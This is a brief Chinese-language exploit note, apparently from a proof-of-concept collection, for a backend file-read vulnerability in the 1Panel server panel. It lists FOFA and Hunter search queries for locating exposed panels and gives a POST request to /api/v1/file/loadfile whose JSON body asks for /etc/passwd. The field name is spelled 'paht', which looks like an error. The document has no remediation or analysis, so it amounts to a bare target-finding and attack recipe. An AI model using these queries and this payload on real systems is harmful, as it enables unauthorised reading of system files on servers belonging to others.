# 1Panel loadfile 后台文件读取漏洞

## 网络测绘

fofa: app="1Panel-面板" || "1Panel"

hunter: web.title="1Panel"

## POC / EXP

```
POST /api/v1/file/loadfile

{"paht":"/etc/passwd"}
```